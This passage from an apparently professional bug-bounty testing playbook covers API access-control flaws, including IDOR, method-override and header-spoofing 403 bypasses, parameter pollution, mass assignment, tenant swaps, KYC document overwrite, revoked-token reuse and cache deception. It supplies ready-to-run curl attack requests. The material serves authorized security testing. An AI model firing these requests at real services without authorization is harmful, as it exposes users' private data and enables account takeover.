  curl -s -X PATCH -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' \
       -d '{"shipping_address":"'"$MARK_A"'"}' https://api.example.com/v1/orders/$ID_B -i | head -1
  # then read it back FROM B'S OWN SESSION
  curl -s -H "Authorization: Bearer $TOKEN_B" https://api.example.com/v1/orders/$ID_B | jq .shipping_address
  # destructive, on an object you created in B for this purpose only
  curl -s -X DELETE -H "Authorization: Bearer $TOKEN_A" https://api.example.com/v1/orders/$THROWAWAY_B -i | head -1
  ```
- **Proof:** The change visible in account B's own session, not merely a 200 to account A. For a delete, B's
  own list endpoint no longer contains the object. Include both account identifiers so the triager can verify
  ownership.
- **Escalation:** Write-IDOR on an *account* object (email, phone, password, recovery contact) is ATO, not data
  modification — rate it there (→ D13).
- **Ruled out when:** Write verbs on cross-account ids return a rejection with a distinct body **and** a
  follow-up read from the victim session shows the object unchanged. A 200/204 with no state change is not a
  finding — verify before filing, and note that a silent no-op 200 is a common shape.

### D15-036 · HTTP method swap and `X-HTTP-Method-Override`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) |
| **Attacker** | AM-05 |
| **Applies to** | REST-shaped APIs; older Rails, some Java stacks and some Node middleware honour the override |
| **Maps to** | API5:2023; PortSwigger access control — method variation |

- **Test:** Routers dispatch to different handlers per method, and not all handlers receive the auth
  middleware. GET may be protected while PUT/DELETE on the same path is not.
- **How:**
  ```bash
  for m in GET HEAD POST PUT PATCH DELETE OPTIONS TRACE; do
    printf '%s -> ' "$m"
    curl -s -o /dev/null -w '%{http_code}\n' -X "$m" "$URL" -H "Authorization: Bearer $TOKEN_A"
  done
  curl -s -i -X POST "$URL" -H "Authorization: Bearer $TOKEN_A" -H 'X-HTTP-Method-Override: DELETE'
  curl -s -i -X POST "$URL?_method=DELETE" -H "Authorization: Bearer $TOKEN_A"
  curl -s -i -X POST "$URL" -H "Authorization: Bearer $TOKEN_A" -d '_method=DELETE'
  ```
- **Proof:** 200/204 on a victim resource, **confirmed by a follow-up GET from the victim session showing the
  modification**. An `OPTIONS` response enumerating allowed methods hands you the rest of the surface for free.
- **Escalation:** → destructive impact / ATO; a 405 that becomes a 200 under the override is also a WAF-bypass
  story if a rule set keys on the verb.
- **Ruled out when:** Every verb on the same path returns 401/403/405 with a distinct body under a
  cross-account id, and the override forms produce the same result as the plain POST (the server ignores them).

### D15-037 · Systematic authorisation sweep with Autorize, then verify every row by hand

| | |
|---|---|
| **Severity ceiling** | Critical (whatever the underlying endpoint warrants) |
| **VRT** | per the underlying endpoint |
| **Attacker** | AM-05 / AM-01 |
| **Applies to** | all; the fastest way to cover a 200-endpoint mobile API in one session |
| **Maps to** | PortSwigger Autorize extension (statuses Bypassed! / Enforced! / Is enforced???); API1:2023; API5:2023 |

- **Test:** Rather than testing endpoints one at a time, replay *every* observed request under a
  lower-privileged and an unauthenticated identity automatically, then triage the differences.
- **How:** Install Jython and Autorize in Burp; put account **B**'s `Authorization` header into the
  "low-privileged user authorization header" box; enable the unauthenticated-request option; drive the app as
  account **A** through the proxy. Configure an **enforcement detector** (a response string, regex, header or
  content-length fingerprint) before you trust any row.
- **Proof:** Rows marked **Bypassed!** with the two responses side by side, each then re-verified manually with
  the two-account protocol and the marker check.
- **Escalation:** Every "Bypassed!" row is a BOLA/BFLA candidate for D15-034/D15-061.
- **Ruled out when:** Every row is **Enforced!** with a configured detector. Rows marked **Is enforced???** are
  inconclusive and are neither a finding nor a negative — resolve each before writing the ruled-out entry.

### D15-038 · Single-account check: object-id predictability

| | |
|---|---|
| **Severity ceiling** | Low alone (it is the multiplier that takes a BOLA from High to Critical) |
| **VRT** | the VRT distinguishes **Iterable** (P1/P2/P3) from **GUID** (P4) object identifiers precisely on this axis |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | API1:2023 prevention guidance ("use random and unpredictable values as GUIDs for records' IDs"); CVE-2015-7889 / EDB 38558 (the message id "just seems to be an incrementing number") |

- **Test:** You do not need a second account to establish enumerability, and enumerability is what converts a
  single-record IDOR into a mass-extraction finding — a full VRT band.
- **How:**
  ```bash
  # create 5-10 objects of the same type in YOUR OWN account a few seconds apart, record the ids
  python3 - <<'PY'
  ids = open('ids.txt').read().split()
  if all(i.isdigit() for i in ids):
      print('deltas:', [int(a)-int(b) for a, b in zip(ids[1:], ids)])
  else:
      print(ids)
  PY
  python3 -c "import uuid,sys; u=uuid.UUID(sys.argv[1]); print('version', u.version)" "$ID"
  ```
- **Proof:** A delta series of `+1` (or a small constant), or a UUID version of 1 or 7 with a decodable
  timestamp. Demonstrate 3–5 sequential reads of *your own* neighbouring objects to show the pattern without
  touching real users' data, then state the extrapolation.
- **Escalation:** Combined with D15-034: "ids increment by 1 and endpoint X has no ownership check" is a
  full-database-read claim, and that is what moves the rating and the bounty tier.
- **Ruled out when:** Ids are v4 UUIDs (version nibble `4`), high-entropy and non-sequential across a sample of
  ten created seconds apart — **and** you also ran D15-039, because non-enumerability only matters if the id
  does not leak.

### D15-039 · Decode the UUID version nibble, then find the in-app leak that defeats AC:H

| | |
|---|---|
| **Severity ceiling** | Critical once the leak path is chained; Low for the bare UUID swap |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_guid` (**P4**) for the bare swap; the iterable nodes once the ids are obtainable |
| **Attacker** | AM-05 |
| **Applies to** | any target whose ids "look random" |
| **Maps to** | HackerOne Platform Standards, IDORs with Unpredictable IDs (effective 2 April 2024, updated 20 January 2026): "Default: Set Attack Complexity to 'High' (AC:H)"; "Set Attack Complexity to 'Low' (AC:L) if the vulnerability report demonstrates a reliable, repeatable method for an attacker to obtain the specific IDs"; RFC 4122 |

- **Test:** "UUID" is not synonymous with "random". UUIDv1 encodes a 100 ns-resolution timestamp in the first
  60 bits plus a MAC-derived node id that is often stable across the app's hosts; v7 still leaks creation time.
  And a v4 UUID that *leaks elsewhere in the app* defeats the AC:H penalty entirely.
- **How:**
  ```bash
  # version = character 14 of the canonical form
  echo "$ID" | cut -c15
  # hunt the leak inside the application, not on Google
  curl -s -H "Authorization: Bearer $TOKEN_B" https://api.target.tld/v1/feed \
    | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | sort -u
  ```
  Leak sources that count: another API response, a share link, a push payload, a QR code, an exported provider
  row (D07), a `Referer`, a public profile, a search endpoint, a "recent items" list that returns other
  tenants' ids.
- **Proof:** A single reproducible chain, both requests in the report: request 1 (as attacker) yields the
  victim's UUID; request 2 (as attacker) uses it to read or modify. For v1, collect ~20 UUIDs from legitimate
  flows, derive the per-instance counter, and brute adjacent values.
- **Escalation:** The same standard warns that third-party-only exposure (search engines, archives) may be
  treated as accepted risk — find an **in-app** leak, not a Google dork. Note some programs (e.g. Spotify)
  exclude UUID-dependent access-control issues outright; check the policy before spending the day.
- **Ruled out when:** The id is v4, appears in no other response reachable by a different principal, is not
  emitted in push payloads, provider rows or share links, and is not present in any list/search response —
  each checked and listed. **Never accept "but the ID is random" as a defence from the vendor: randomness
  raises enumeration cost, not the existence of the bug.**

### D15-040 · 401/403 bypass with client-trusted authorisation headers and path-shape tricks

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | all, especially APIs behind a CDN/WAF that terminates and re-forwards |
| **Maps to** | API5:2023; PortSwigger access control — platform misconfiguration (`X-Original-URL`, `X-Rewrite-URL`); H1 "Unauthorized access to admin/setpassword page by bypass 403 forbidden" |

- **Test:** Some gateways authorise on a header the client can set, or on a normalised path that differs from
  the one the origin routes on. Add the header set and the path variants to every blocked request.
- **How:**
  ```bash
  for h in "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-Origin: 127.0.0.1" "X-Forwarded-For: 127.0.0.1" \
           "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Original-URL: /admin/users" \
           "X-Rewrite-URL: /admin/users"; do
    printf '%-45s -> ' "$h"
    curl -s -o /tmp/o -w '%{http_code} %{size_download}\n' -H "$h" -H "Authorization: Bearer $TOKEN_LOW" \
      https://api.example.com/v1/admin/users
  done
  for p in '/admin/users' '/admin//users' '/./admin/users' '/admin/users/.' '/%2e/admin/users' '/ADMIN/users' \
           '/admin/users%20' '/admin/users..;/'; do
    printf '%-24s -> ' "$p"
    curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN_LOW" "https://api.example.com$p"
  done
  ```
- **Proof:** A status transition from 401/403 to 200/302 **with a real body** — the corpus's example is
  `GET /delete?user=test` returning 401, and the same request with `X-Custom-IP-Authorization: 127.0.0.1`
  returning 302 Found. Apply the Body-Diff Rule (D15-029): a 200 whose body is byte-identical to the 403 body
  is not a bypass.
- **Escalation:** If `X-Forwarded-For` is honoured for authorisation, test whether it is also honoured for rate
  limiting (D15-086), IP allow-lists, geofencing and fraud scoring.
- **Ruled out when:** Every header and path variant returns the same status **and** the same body as the
  baseline rejection, and the edge normalises the path identically to the origin (test one variant against a
  known-200 route to prove the normalisation, not just the block).

### D15-041 · Array-wrap and parameter pollution against an equality ownership check

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it yields both |
| **Attacker** | AM-05 |
| **Applies to** | any endpoint that accepts an id in a body or query |
| **Maps to** | API1:2023; field methodology (`hunt-idor` "Array-wrap parameter") |

- **Test:** When the check is `if record.user_id == current_user.id`, supplying both ids can pass the check on
  the first value while the query operates on the second — a TOCTOU-shaped auth bypass.
- **How:**
  ```bash
  curl -s "https://api.example.com/v1/orders?id=$ID_A&id=$ID_B" -H "Authorization: Bearer $TOKEN_A"
  curl -s -X POST https://api.example.com/v1/orders/fetch -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' --data-binary '{"id":["'"$ID_A"'","'"$ID_B"'"]}'
  curl -s "https://api.example.com/v1/orders?id[]=$ID_B" -H "Authorization: Bearer $TOKEN_A"
  # duplicate JSON keys - which one wins?
  curl -s -X POST https://api.example.com/v1/orders/fetch -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' --data-binary '{"id":"'"$ID_A"'","id":"'"$ID_B"'"}'
  ```
- **Proof:** The ownership check passes and the response contains account B's marker.
- **Escalation:** Apply the same shape to write operations, and to money-adjacent duplicate keys
  (`{"amount":1000,"amount":1}`) — the precedence difference is a price-tampering lead (D15-076).
- **Ruled out when:** Every polluted form returns either the same rejection as the bare cross-account id, or
  the *first* value's own data with no marker — and the duplicate-key form is rejected as malformed. Record
  which parser precedence the stack uses; it matters to D15-070.

### D15-042 · Smuggle a hidden ownership field into the JSON body

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it reaches another user's object |
| **Attacker** | AM-05 |
| **Applies to** | **mobile backends specifically** — the corpus names them as the canonical source of this bug |
| **Maps to** | API1:2023; API3:2023; `hunt-idor` root cause #3 ("trusting client-supplied IDs in request bodies — mobile apps or SPAs send `org_id`") |

- **Test:** The endpoint infers ownership from the session and omits an id field in normal requests. Adding one
  explicitly may override the session-derived owner. Mobile clients are where this originates, because the API
  was designed around the app's payload shape.
- **How:**
  ```bash
  for f in owner_id user_id userId account_id accountId organization_id org_id tenant_id senderId merchant_id customer_id; do
    printf '%-16s -> ' "$f"
    curl -s -o /tmp/o -w '%{http_code}\n' -X POST https://api.example.com/v1/notes \
      -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' \
      -d "{\"title\":\"$MARK\",\"$f\":\"$ID_B\"}"
  done
  # then read account B's own list and look for the object
  curl -s https://api.example.com/v1/notes -H "Authorization: Bearer $TOKEN_B" | grep -c "$MARK"
  ```
- **Proof:** The object appearing in account B's own listing, or the action taking effect on B's account.
- **Escalation:** → privilege escalation in one request when the field is `role`/`tenant_id` (D15-064); →
  cross-account object creation when it is an owner id.
- **Ruled out when:** Every injected owner field is ignored (the object lands in A's account) **and** the
  response object echoes the session-derived owner, verified by reading from B's session. Field names must come
  from the DTOs (D15-004) and the response bodies (D15-064), not from this list alone.

### D15-043 · Tenant-id swap in the URL path

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-05 |
| **Applies to** | multi-tenant backends |
| **Maps to** | API1:2023; `hunt-idor` "Tenant-ID swap in multi-tenant SaaS" (root cause #8) |

- **Test:** The tenant derives from the URL, not the session. The app checks that you are *authenticated* but
  not that you *belong to the requested tenant*. Cross-tenant leakage is the top concern for any B2B program.
- **How:**
  ```bash
  curl -s -H "Authorization: Bearer $TOKEN_A" https://api.example.com/orgs/$SLUG_B/users
  curl -s -H "Authorization: Bearer $TOKEN_A" https://api.example.com/api/tenants/$TENANT_B/billing
  # also the header form the mobile client may send
  curl -s -H "Authorization: Bearer $TOKEN_A" -H "X-Tenant-Id: $TENANT_B" https://api.example.com/v1/users
  ```
- **Proof:** Cross-tenant data carrying the second tenant's marker, with the non-existent-tenant control
  returning a different shape.
- **Escalation:** → mass extraction (stop at PoC); combine with D15-068 for cross-tenant privilege escalation.
- **Ruled out when:** The tenant segment is ignored in favour of the session's tenant claim, or a mismatch
  returns a distinct rejection body — and the same is true for the header and query forms.

### D15-044 · Search, filter and sort parameters as an authorisation bypass

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → P1 with the write/modify variant |
| **Attacker** | AM-05 |
| **Applies to** | all REST APIs with query DSLs; JSON:API and OData-style backends are the highest-yield |
| **Maps to** | API1:2023; API3:2023; PortSwigger GraphQL "exploiting unsanitised arguments" is the equivalent for GraphQL |

- **Test:** Filtering is often applied *after* an unscoped query, or the filter field itself is
  attacker-controlled — letting you filter by another user's id, another tenant, or an internal status. Sort
  parameters are an under-used oracle: sorting by a field you cannot read still orders the results by it.
- **How:**
  ```bash
  curl -s "https://api.example.com/v1/orders?userId=$ID_B"          -H "Authorization: Bearer $TOKEN_A"
  curl -s "https://api.example.com/v1/orders?filter[user.id]=$ID_B" -H "Authorization: Bearer $TOKEN_A"
  curl -s "https://api.example.com/v1/orders?status=INTERNAL_REVIEW" -H "Authorization: Bearer $TOKEN_A"
  curl -s "https://api.example.com/v1/search?q=*&fields=email,phone" -H "Authorization: Bearer $TOKEN_A"
  curl -s "https://api.example.com/v1/orders?sort=user.email"        -H "Authorization: Bearer $TOKEN_A"
  curl -s "https://api.example.com/v1/orders?include=user&expand=paymentMethods" -H "Authorization: Bearer $TOKEN_A"
  ```
  On OData-shaped backends (`OData-Version: 4.0` / `DataServiceVersion: 3.0` headers, paths `/_api/`,
  `/odata/`, `/api/data/v9.x/`, `/sap/opu/odata/`) the same idea has extra reach: ACLs are enforced on the
  projection but not on `$orderby`/`$filter`, so `?$orderby=<protected column> desc&$select=fullname` leaks the
  protected column through the returned *order*, and `?$expand=Customer($expand=PaymentMethods)` joins along
  navigation properties without re-checking the ACL. Try `$metadata` for the schema.
- **Proof:** Records belonging to account B (marker-verified) returned under A's token, or a `fields=`/
  `include=`/`expand=` parameter honoured for properties the endpoint normally omits.
- **Escalation:** A honoured expansion parameter is a general excessive-data-exposure lever across every
  endpoint that supports it; a navigation-property join is the root cause behind the disclosed Power Apps
  Portals 38M-record leak class.
- **Ruled out when:** Every filter/sort/expand key is rejected as an invalid choice (the enum signature in
  D15-027) or is applied *after* a session-scoped `WHERE`, demonstrated by the result set never containing a
  foreign owner id across ten variations.

### D15-045 · Bulk and sync endpoints: the mobile-specific mass-extraction surface

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → P1 where it crosses tenants and writes are possible |
| **Attacker** | AM-05 |
| **Applies to** | offline-first, messaging, field-service and CRM apps |
| **Maps to** | API1:2023; API3:2023; API4:2023 (unbounded `limit`) |

- **Test:** Offline-capable apps expose "give me everything changed since T" endpoints. They are designed to
  return a lot, they often accept a scope parameter, and they are rarely rate limited. `since=0` is the tell —
  it usually means "everything ever".
- **How:**
  ```bash
  grep -iE 'sync|delta|since|bulk|batch|export|feed|cursor|changes' endpoints.txt
  curl -s "https://api.example.com/v1/sync?since=0&limit=100000" -H "Authorization: Bearer $TOKEN_A" | jq 'length'
  curl -s "https://api.example.com/v1/sync?since=0&scope=all"    -H "Authorization: Bearer $TOKEN_A" \
    | jq -r '.[].ownerId' | sort -u | wc -l
  ```
- **Proof:** A single response containing records whose owner ids include accounts other than yours (count the
  distinct owner ids), or a record count far exceeding your account's data.
- **Escalation:** If the cursor is not scoped to your account, iterate it; combine with D15-086 because one
  call per thousand records defeats any per-request limit.
- **Ruled out when:** `since=0` returns only your own records, the owner-id cardinality is 1, `limit` is capped
  server-side, and the cursor rejects a value minted in another session.

### D15-046 · Single-account check: excessive data exposure in responses

| | |
|---|---|
| **Severity ceiling** | High (Critical when a list endpoint returns other users' PII — then it is BOLA by another name and should be reported as such) |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for the cross-user case; the own-data case is Medium and often Informational |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | API3:2023 Broken Object Property Level Authorization — the "excessive data exposure" sub-case (formerly API3:2019); its prevention text: "explicitly whitelist returned properties … avoid automatic binding functions like `to_json()`" |

- **Test:** Compare what the API returns against what the app renders. Mobile clients over-fetch because the
  server serialises whole ORM objects; the fields the UI drops are still on the wire. Pay special attention to
  **list** endpoints — a search result that embeds each user's full profile leaks at scale.
- **How:**
  ```bash
  jq -r 'paths(scalars) | join(".")' response.json | sort -u > server_fields.txt
  grep -iE 'email|phone|address|dob|pan|aadhaar|ssn|token|secret|internal|role|isAdmin|balance|cost|margin|score|flag|hash|note' server_fields.txt
  # diff against the fields the client's model classes actually read
  comm -23 <(sort -u server_fields.txt) <(sort -u body_fields.txt)
  ```
- **Proof:** A captured response containing fields the UI never shows, with the on-screen render alongside. For
  a list endpoint, one request returning N records × M hidden fields.
- **Escalation:** Hidden fields are also your mass-assignment wordlist — every property the server *returns* is
  a property it may *accept* (D15-064). Admin-only values rendered to every client and merely hidden in the UI
  are their own finding (H1 #447975 $750, and its fix-bypass #479139 $500 — re-test every fix for a sibling
  surface).
- **Ruled out when:** Every returned property is either rendered in the UI or is non-sensitive metadata, and no
  list/search endpoint returns another principal's fields. Fields already public on the user's own profile page
  are not a finding.

### D15-047 · Filename-IDOR and pre-signed media URLs

| | |
|---|---|
| **Severity ceiling** | Critical (identity/KYC/medical documents) |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) / `.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-01 (pre-signed URLs usually need no session at all) |
| **Applies to** | all apps that upload or display user documents |
| **Maps to** | API1:2023; sehno → Risky Functionality – File Uploads ("uploaded files not directly accessible within the web root"; "not served on the same hostname/port"; "integrated with the authentication and authorisation schemas") |

- **Test:** Mobile apps fetch images and documents through pre-signed URLs or `/files/{id}` routes. Test four
  things separately: is the signature bound to the object *and* the user; does it expire; is the underlying
  object key predictable; and does the URL work with no session at all.
- **How:**
  ```bash
  curl -sI "$SIGNED_URL"                                   # 1. no auth header, clean client, different network
  curl -sI "${SIGNED_URL/$MY_OBJECT/$OTHER_OBJECT}"        # 2. swap the object id inside the signed URL
  curl -sI "$SIGNED_URL"                                   # 3. after logout, and after the stated expiry
  # 4. predictable keys: uploads/<userId>/<epoch>.jpg, /invoices/download?file=invoice_12345.pdf
  curl -s -o /dev/null -w '%{http_code} %{url_effective}\n' "https://api.example.com/invoices/download?file=invoice_$((N-1)).pdf" \
    -H "Authorization: Bearer $TOKEN_A"
  ```
- **Proof:** Retrieval of another user's document via id substitution, or retrieval long after expiry,
  evidenced by the returned bytes plus the `Date`/`Expires` headers. Redact the document in the report but keep
  the raw file, hashed, in evidence storage.
- **Escalation:** If the endpoint also sets `Content-Disposition: attachment; filename="<user-supplied>"`
  without sanitising newlines or quotes, chain to response-header injection. Predictable keys plus no auth is a
  bulk document dump — stop at proof.
- **Ruled out when:** The signature covers the object key and a user claim, expiry is enforced (a
  post-expiry fetch returns 403 with a distinct body), keys are non-sequential, and the storage host refuses
  anonymous reads.

### D15-048 · "Download my data" / GDPR export: IDOR on the job id and on the artefact

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → P1 given the data class and enumerability |
| **Attacker** | AM-05 / AM-01 |
| **Applies to** | all apps with a data-export / "download my information" feature |
| **Maps to** | API1:2023 (no external identifier verified in the corpus for this specific surface) |

- **Test:** Data-export is a low-traffic feature that hands out a single archive containing *everything*. Test
  the job id for IDOR, the download URL for predictability and expiry, and whether the archive is fetched
  without the session.
- **How:**
  ```bash
  curl -s -i -X POST https://api.target/v1/me/export -H "Authorization: Bearer $A"       # note the job id
  curl -s -i https://api.target/v1/me/export/$OTHER_JOB_ID -H "Authorization: Bearer $A"
  curl -s -D- -o /dev/null "$SIGNED_DOWNLOAD_URL"                                        # no Authorization at all
  # and after the session was revoked
  ```
- **Proof:** Another owned account's export archive downloaded with your token, or the signed URL still serving
  the archive with no credentials after the session was revoked. Open the archive and show the marker field.
- **Escalation:** The export archive typically contains the KYC images and support transcripts that D15-049 and
  D15-050 reach one at a time — one request, complete record.
- **Ruled out when:** The job id is bound to the requesting subject (a cross-account job id returns a distinct
  404/403), the artefact requires the session, and the URL expires.

### D15-049 · Support-ticket, message and attachment IDOR — three ids, tested separately

| | |
|---|---|
| **Severity ceiling** | Critical (attachments routinely include identity documents and payment artefacts) |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) baseline; P1 given the data class and a write |
| **Attacker** | AM-05 |
| **Applies to** | all apps with in-app support ticketing |
| **Maps to** | API1:2023 (no external identifier verified in the corpus for this specific surface) |

- **Test:** Support tickets carry the highest-sensitivity free text in the product. Test the **ticket id**, the
  **message id** and the **attachment id** independently — attachments are often served by a separate CDN path
  with a different, or absent, authorisation check.
- **How:**
  ```bash
  curl -s -i https://api.target/v1/support/tickets/$OTHER_ID              -H "Authorization: Bearer $A"
  curl -s -i https://api.target/v1/support/tickets/$MINE/messages/$OTHER_MSG_ID -H "Authorization: Bearer $A"
  curl -s -D- -o /dev/null "https://files.target/support/$ATTACHMENT_UUID"   # no auth header at all
  ```
- **Proof:** Another owned account's ticket body or attachment returned, showing a field that identifies the
  other account (its marker, its masked email in the transcript, its uploaded document).
- **Escalation:** Support transcripts frequently contain OTPs and agent-issued reset links → D13. Agent-side
  replies are also an attacker-writable field rendered in a first-party WebView → D10.
- **Ruled out when:** All three id classes are scoped to the requester, and the attachment host requires the
  session (not merely an unguessable UUID — that is D15-039's question, answered separately).

### D15-050 · KYC document retrieval IDOR and re-upload overwrite

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-05 |
| **Applies to** | all fintech, crypto, gig-economy, lending, gambling and marketplace apps |
| **Maps to** | API1:2023; API3:2023 (no external identifier verified in the corpus for this specific surface) |

- **Test:** Identity verification is absent from most checklists as a *component*. Three separate questions:
  can you fetch another user's uploaded document; can you upload a document **against another user's**
  verification record; and does re-uploading reset a rejected or blocked KYC state?
- **How:**
  ```bash
  grep -rniE 'kyc|verification|identity|document_type|proof_of|passport|national_id|onfido|sumsub|veriff|jumio|idfy|persona' $S | head -40
  curl -s https://api.target/v1/kyc/documents/$OTHER_DOC_ID -H "Authorization: Bearer $A" -D- -o doc.jpg
  curl -s -i -X POST https://api.target/v1/kyc/documents -H "Authorization: Bearer $A" \
    -F "user_id=$ID_B" -F 'type=passport' -F 'file=@x.jpg'
  curl -s -i -X POST https://api.target/v1/kyc/submit -H "Authorization: Bearer $A" -d '{"status":"approved"}'
  ```
- **Proof:** `doc.jpg` opening as the other owned account's identity document (redact in the report, keep the
  hashed original in evidence), or account B's verification record now carrying a document you uploaded.
- **Escalation:** Identity-document disclosure is the highest-sensitivity data class in most programs, and a
  document-overwrite is an identity-fraud primitive. Pair with D15-048 (the archive contains the documents) and
  D15-082 (the status flag).
- **Ruled out when:** Document ids are scoped to the owner, the upload endpoint derives the subject from the
  session and ignores a supplied `user_id`, and a re-upload after rejection does not reset the state — all
  three demonstrated on tester-owned accounts.

### D15-051 · Bulk-action authorisation gap

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) → P1 with read |
| **Attacker** | AM-05 |
| **Applies to** | any bulk endpoint |
| **Maps to** | API1:2023; field methodology (`hunt-business-logic` "bulk-action authorization gap") |

- **Test:** "Bulk delete / archive / export" accepts a list of object ids and checks ownership on none of them,
  or only on the first. The per-object endpoint is often correct while the bulk one is not.
- **How:**
  ```bash
  # mixed list: objects you own first, then one you do not
  curl -s -i -X POST https://api.example.com/v1/orders/bulk-archive -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' -d '{"ids":["'"$ID_A1"'","'"$ID_A2"'","'"$ID_B"'"]}'
  # and a list entirely from the other account
  curl -s -i -X POST https://api.example.com/v1/orders/bulk-archive -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' -d '{"ids":["'"$ID_B"'"]}'
  ```
  Test both orderings — "checks only the first element" and "checks only the last" are different bugs.
- **Proof:** The other account's object modified, verified from its own session.
- **Escalation:** → mass data destruction; also a good rate-limit bypass because one request carries N
  operations (D15-086).
- **Ruled out when:** Both orderings and the all-foreign list are rejected atomically (no partial application),
  and a mixed list either fails entirely or applies only to the owned subset — verified from both sessions.

### D15-052 · Soft-delete and revoked access that the auth cache still honours

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4) as the nearest node; rate the cross-tenant access it enables under `broken_access_control.*` |
| **Attacker** | AM-05 (a former member of the tenant) |
| **Applies to** | team/org products |
| **Maps to** | API2:2023; `hunt-idor` Chain 5 (the removed-staff persistence class) and root cause #7 |

- **Test:** The "remove member" endpoint flips `active=false` but does not invalidate the session or the
  personal access token. The IDOR is *temporal*: the user no longer has permission per the policy table, but
  the cached auth context still passes. Weeks of post-termination cross-tenant access, with GDPR/CCPA exposure.
- **How:** Capture the to-be-removed user's session token and any PAT; have the admin remove them through the
  normal UI flow; wait (minutes, then hours); re-issue API calls with the captured credentials.
  ```bash
  for t in 0 300 3600 86400; do
    echo -n "t+${t}s: "
    curl -s -o /dev/null -w '%{http_code}\n' https://api.example.com/v1/orgs/$ORG/members -H "Authorization: Bearer $REMOVED_TOKEN"
  done
  ```
- **Proof:** Successful privileged calls after removal, with the admin UI showing the member is gone.
- **Escalation:** → data exfiltration after offboarding; pair with D15-045 for volume.
- **Ruled out when:** The removed principal's token fails immediately at every horizon tested, *and* its
  refresh token also fails (test both — revoking the access token while leaving the refresh token live is the
  same bug with a delay).

### D15-053 · Share and invite token reuse, non-expiry and cross-resource scope

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) baseline; higher where the token is predictable or grants org membership |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | collaboration features |
| **Maps to** | API1:2023; `hunt-idor` "IDOR via share or invite link reuse"; `hunt-business-logic` "invitation-token reuse"; H1 #2032716 ($12,500, viewing any user's email via a crafted invitation) |

- **Test:** Tokens that look random but are guessable, sequential, or never burn. Also: a token granting
  collaboration on object A should not grant access to object B in the same tenant, and a single-use invite
  should not redeem twice.
- **How:** Generate a share link for your own resource, study the format (length, alphabet, entropy, embedded
  ids), then: redeem it twice; redeem it after the stated expiry; substitute a different object id while
  keeping the same token; and redeem an invite token on a second account.
- **Proof:** Cross-resource access, or a second redemption producing additional org membership or a duplicated
  privilege grant, read back from the org member list.
- **Escalation:** → unauthorised org membership → D15-068.
- **Ruled out when:** Tokens are high-entropy, single-use (the second redemption returns a distinct error),
  expire, and are bound to both the resource and the invited address.

### D15-054 · IDOR through the caching layer, and web cache deception on authenticated paths

| | |
|---|---|
| **Severity ceiling** | Critical when reproducible |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for the data; the mechanism is a cache-key defect |
| **Attacker** | AM-01 / AM-02 |
| **Applies to** | CDN/proxy-fronted APIs |
| **Maps to** | API8:2023; `hunt-idor` "IDOR through caching layer"; H1 #409370, #728664, #622122, #942629, #1183263, #1096609, #326639 (web-cache class) |

- **Test:** Two related defects. **Cross-user caching:** a response cached at a layer whose cache key omits the
  user dimension. **Cache deception:** a CDN that caches by extension serves an authenticated JSON body to
  anyone who requests the same URL with a static-looking suffix.
- **How:**
  ```bash
  curl -sI "https://api.example.com/v1/me" -H "Authorization: Bearer $TOKEN_A" | grep -iE 'cache-control|vary|age|x-cache'
  # deception: authenticated request to a static-looking path, then anonymous fetch of the same URL
  curl -s -H "Authorization: Bearer $TOKEN_A" https://api.example.com/v1/me/profile.css -D- -o /dev/null
  curl -s https://api.example.com/v1/me/profile.css | head
  # unkeyed-header probe (poisoning)
  curl -s -H "X-Forwarded-Host: evil.tld" https://api.example.com/v1/config -D- | grep -i evil
  ```
  Vulnerable when `Vary` lacks the user-distinguishing header (`Authorization`, session cookie) and the
  response is cacheable.
